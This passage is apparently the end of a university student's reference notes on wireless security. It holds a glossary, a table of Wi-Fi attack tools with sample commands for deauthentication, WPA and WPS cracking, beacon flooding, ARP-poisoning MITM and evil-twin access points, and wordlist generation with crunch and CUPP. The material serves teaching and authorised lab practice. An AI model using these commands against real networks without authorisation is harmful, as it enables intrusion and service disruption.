| **Deauthentication**   | 802.11 management frame that disconnects a client from an AP (unauthenticated)           |
| **Dictionary Attack**  | Cracking method that tries each word in a wordlist as the password                       |
| **EAP**                | Extensible Authentication Protocol — framework for enterprise wireless auth              |
| **ESSID**              | Extended SSID — the human-readable network name                                          |
| **Evil Twin**          | Fake AP with same SSID as legitimate network to lure victims                             |
| **Four-Way Handshake** | WPA2 key exchange process between client and AP that proves password knowledge           |
| **GTK**                | Group Temporal Key — used for broadcast/multicast traffic in WPA2                        |
| **Hidden SSID**        | AP that does not include its SSID in beacon frames                                       |
| **ICV**                | Integrity Check Value — CRC-32 checksum used in WEP for data integrity                   |
| **IV**                 | Initialization Vector — random 24-bit value used in WEP per-packet key generation        |
| **MAC**                | Media Access Control — unique hardware address of a network interface                    |
| **MAC Spoofing**       | Changing your adapter's MAC to impersonate another device                                |
| **MDK3**               | Wireless attack tool for beacon flooding, authentication DoS, etc.                       |
| **MIC**                | Message Integrity Code — cryptographic proof of WPA handshake validity                   |
| **MITM**               | Man-in-the-Middle — attacker intercepts communication between two parties                |
| **Monitor Mode**       | Adapter mode that captures all 802.11 frames regardless of destination                   |
| **PBKDF2**             | Password-Based Key Derivation Function 2 — used to derive PMK from WPA password          |
| **PEAP**               | Protected EAP — WPA Enterprise EAP type; tunnels MSCHAPv2 inside TLS                     |
| **PMK**                | Pairwise Master Key — derived from password; not transmitted; used to generate PTK       |
| **PTK**                | Pairwise Transient Key — session encryption key derived from PMK + nonces + MACs         |
| **RADIUS**             | Remote Authentication Dial-In User Service — authentication server for WPA Enterprise    |
| **Rainbow Table**      | Pre-computed table of hash values (PMKs) for fast password cracking                      |
| **RC4**                | Stream cipher used in WEP (now considered broken)                                        |
| **Reaver**             | Tool for WPS PIN brute force attacks                                                     |
| **RogueAP**            | Unauthorized access point on your network that can eavesdrop                             |
| **SSID**               | Service Set Identifier — the name of a wireless network                                  |
| **SNonce**             | Station Nonce — random value sent by client in WPA handshake packet 2                    |
| **WEP**                | Wired Equivalent Privacy — first Wi-Fi encryption (1997); completely broken              |
| **WPA / WPA2**         | Wi-Fi Protected Access — current wireless security protocols                             |
| **WPA3**               | Latest Wi-Fi security standard; adds SAE authentication and PMF protection               |
| **WPS**                | Wi-Fi Protected Setup — PIN-based simplified connection; vulnerable to brute force       |
| **XOR**                | Exclusive OR — bit operation used in WEP encryption (combining keystream with plaintext) |

---

## 22. Tools Reference & Further Learning

### Core Tool Reference

| Tool            | Purpose                                          | Key Commands                                   |
| --------------- | ------------------------------------------------ | ---------------------------------------------- |
| **airmon-ng**   | Enable/disable monitor mode                      | `airmon-ng start wlan0`                        |
| **airodump-ng** | Packet capture, AP discovery                     | `airodump-ng wlan0mon`                         |
| **aireplay-ng** | Packet injection (deauth, fake auth, ARP replay) | `aireplay-ng --deauth 20 -a BSSID wlan0mon`    |
| **aircrack-ng** | WEP/WPA cracking                                 | `aircrack-ng -w wordlist cap_file`             |
| **airolib-ng**  | Rainbow table database                           | `airolib-ng db --import passwd file`           |
| **macchanger**  | MAC address spoofing                             | `macchanger -r wlan0`                          |
| **reaver**      | WPS PIN brute force                              | `reaver -i wlan0mon -b BSSID`                  |
| **wash**        | Discover WPS-enabled APs                         | `wash -i wlan0mon`                             |
| **mdk3**        | Beacon flood, auth DoS                           | `mdk3 wlan0mon b -n "FakeAP"`                  |
| **ettercap**    | ARP poisoning / MITM                             | `ettercap -TQ -M arp:remote`                   |
| **hostapd-wpe** | Fake WPA Enterprise AP                           | `hostapd-wpe config_file`                      |
| **asleap**      | Crack MSCHAPv2 responses                         | `asleap -C challenge -R response -W wordlist`  |
| **fluxion**     | Evil twin automation                             | `bash fluxion.sh`                              |
| **john**        | Dictionary attack with session saving            | `john --wordlist=list --stdout --session=name` |
| **wireshark**   | Packet analysis / capture                        | GUI tool                                       |
| **tcpdump**     | CLI packet capture                               | `tcpdump -i wlan0mon -w file.pcap`             |

### Practice Platforms for Wireless Security

| Platform                   | Focus                                                            |
| -------------------------- | ---------------------------------------------------------------- |
| **TryHackMe**              | Wireless hacking rooms (search: "Wi-Fi hacking", "WPA cracking") |
| **Hack The Box**           | Network challenges, wireless labs                                |
| **HackRF One + GNU Radio** | Software-defined radio; understand RF signals                    |
| **Your own lab**           | Best learning — set up deliberate vulnerable configs             |

### Recommended Wordlists

```bash
# Built-in Kali Linux
/usr/share/wordlists/rockyou.txt          # 14M passwords
/usr/share/wordlists/fasttrack.txt        # Common enterprise passwords

# Download specialized Wi-Fi wordlists
# (search GitHub: "wifi password wordlist")

# Generate targeted wordlists with CUPP (Common User Passwords Profiler)
pip install cupp
cupp -i    # Interactive profile builder

# Generate with Crunch (patterns)
crunch 8 10 0123456789 -o numeric_8to10.txt   # All 8-10 digit numbers
crunch 8 8 @,%^          # @ = lowercase, , = uppercase, % = digit, ^ = symbol
```

### Relevant RFCs & Standards

| Standard      | Description                                           |
| ------------- | ----------------------------------------------------- |
| IEEE 802.11   | Base Wi-Fi standard                                   |
| IEEE 802.11i  | WPA2 security (AES-CCMP)                              |
| IEEE 802.11w  | Protected Management Frames (prevents deauth attacks) |
| IEEE 802.11ax | Wi-Fi 6 standard                                      |
| RFC 3748      | EAP (Extensible Authentication Protocol)              |
| RFC 2865      | RADIUS protocol                                       |

### Certifications Covering Wireless Security

| Cert                  | Provider           | Wireless Coverage                 |
| --------------------- | ------------------ | --------------------------------- |
| **CompTIA Security+** | CompTIA            | Strong wireless fundamentals      |
| **CEH**               | EC-Council         | Wireless hacking techniques       |
| **CWSP**              | CWNP               | Specialist wireless security cert |
| **OSCP**              | Offensive Security | Includes Wi-Fi in some labs       |
| **GAWN**              | SANS/GIAC          | Pure wireless security specialist |

---

_Notes compiled from Wireless Network Security Course video transcripts_
_University Cybersecurity Department — Student Reference Document_
_All lab work conducted in authorized environments: own access points, own devices, own web applications_
_Last updated: 2024_
